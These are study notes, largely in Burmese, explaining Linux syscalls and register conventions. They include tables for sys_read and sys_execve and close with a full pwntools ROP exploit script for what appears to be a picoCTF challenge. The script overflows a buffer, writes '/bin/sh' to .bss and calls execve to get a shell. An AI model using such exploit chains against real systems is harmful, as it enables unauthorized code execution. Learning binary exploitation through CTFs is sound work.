

	System Call (syscall) ဆိုတာ  User Program ကနေ Linux Kernel တိုက်ရိုက်ခိုင်းတဲ့
	CPU instruction တစ်ခုဖြစ်ပါတယ်
	user-space program က kernel-space ကို ဝင်ပြီး OS ရဲ့ ဝန်ဆောင်မှုတွေ (file open, process create, network send) ကို တောင်းဆိုတဲ့ နည်းလမ်း
	syscall number တစ်ခုစီနဲ့ သက်ဆိုင်တဲ့ function ကို သတ်မှတ်ပေးထားတဲ့ ဇယားဖြစ်တယ် 
	built in function သုံးတိုင်း ဒီကောင်ရှိတယ်
	ဆိုတော့
	dynamically linked မှာ syscall က libc ထဲမှာရှိနေမယ်
	statically lined မှာ  syscall က binary file တွေထဲမှာရှိနေမယ်

	For example
	- File ဖွင့်ချင် → `open()` syscall သုံး
    
	- File ဖတ်ချင် → `read()` syscall သုံး
    
	- Program ရပ်ချင် → `exit()` syscall သုံး
    
	- Shell ရချင် → `execve()` syscall သုံး



## `System call ခေါ်မယ်ဆိုရင် 
---

#### `1.System number ကိုသိရမယ်` 

	 ဘယ် system call ကိုခေါ်မလဲဆိုတာသိဖို့
     Linux မှာဆို eax (32-bit) ဒါမှမဟုတ် rax (64-bit) register ထဲမှာ system call number ထည့်ရပါတယ်
     ဥပမာ: exit system call ဆို number 1, write ဆို number 4


#### `2. Arguments ပြင်ဆင်ရမယ်`

	- System call ကိုပို့ချင်တဲ့ arguments တွေကို register တွေထဲထည့်ရပါတယ်
    32-bit Linux အတွက်
```
	eax - syscall number ထည့်ရန်
    ebx - 1st argument
    ecx - 2nd argument  
    edx - 3rd argument
    esi - 4th argument
    edi - 5th argument
    ebp - 6th argument
    
```
    
	 64-bit Linux အတွက်
 ```
	rax - syscall number ထည့်ရန်
    rdi - 1st argument
    rsi - 2nd argument
    rdx - 3rd argument  
    r10 - 4th argument
    r8  - 5th argument
    r9  - 6th argument
 ```



#### `3.System Call Interrupt သို့မဟုတ် Instruction `

	- 32-bit မှာ: int 0x80 instruction သုံးရပါတယ် 
	- 64-bit မှာ: syscall instruction သုံးရပါတယ်
    

#### `4. Return Value ကောက်ယူခြင်း`

	System call ပြီးရင် return value က eax/rax ထဲရောက်လာပါတယ်
    Error ဆို negative value (သို့) -1 to -4095 range ရနိုင်ပါတယ်


https://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/

system call table for both 64bit and 32 bit:
https://chromium.googlesource.com/chromiumos/docs/+/master/constants/syscalls.md

---
---

## `Sys_read`

| %rax | System call | %rdi            | %rsi      | %rdx         |     |     |     |
| :--- | :---------- | :-------------- | :-------- | :----------- | :-- | :-- | :-- |
| 0    | sys_read    | unsigned int fd | char *buf | size_t count |     |     |     |

	%rax - system number 
##### `File Descriptors  %rdi

	file descriptor က ဘယ် file ကနေ ဖတ်မလဲဆိုတာပြတယ်

| FD     | Description              | Usage in Exploits  |
| ------ | ------------------------ | ------------------ |
| **0**  | Standard Input (stdin)   | User input ဖတ်ဖို့ |
| **1**  | Standard Output (stdout) | Output ပြဖို့      |
| **2**  | Standard Error (stderr)  | Error messages     |
| **3+** | Opened files             | File operations    |

	%rsi - ဖတ်ထားတဲ့ data store မယ့်နေရာ
	%rdx - ဖတ်မယ် count အရည်အတွက်


---

## `Sys_execve

| rax | System call | rdi                  | rsi                      | rdx                      |
| --- | ----------- | -------------------- | ------------------------ | ------------------------ |
| 59  | sys_execve  | const char *filename | const char *const argv[] | const char *const envp[] |


	rax - system number
	rdi - runချင်တဲ့ program file လမ်းကြောင်း
	rsi - argv[] arguments 
	rdx - variable environment

---




```python
from pwn import *

e = ELF("./vuln")
p = process(e.path)
#p = remote("shape-facility.picoctf.net", 51698)
read = e.symbols['read']
syscall = p64(0x000000000040138c)
randomm = [84,87]

main = p64(0x0000000000400c9c)
pop_rax = p64(0x00000000004005af)
pop_rdi = p64(0x00000000004006a6)
pop_rsi = p64(0x0000000000410b93)
pop_rdx = p64(0x0000000000410602)
bss = p64(e.bss())

payload = b'\x90'*120
payload += pop_rdi
payload += p64(0)
payload += pop_rsi
payload += bss
payload += pop_rdx
payload += p64(9)
payload += p64(read)
payload += main



p.recvline(b"What number would you like to guess?")
p.sendline(str(randomm[0]).encode())
p.recvuntil(b"Name? ")
p.sendline(payload)
p.sendline(b"/bin/sh\x00")
input("Just Enter to exploit")
p.recvline(b"What number would you like to guess?")

payload = b'\x90'*120
payload += pop_rax
payload += p64(0x3b)
payload += pop_rdi
payload += bss
payload += pop_rsi
payload += p64(0)
payload += pop_rdx
payload += p64(0)
payload += syscall


p.recvline(b"What number would you like to guess?")
p.sendline(str(randomm[1]).encode())
p.recvuntil(b"Name? ")
p.sendline(payload)
p.interactive()
```
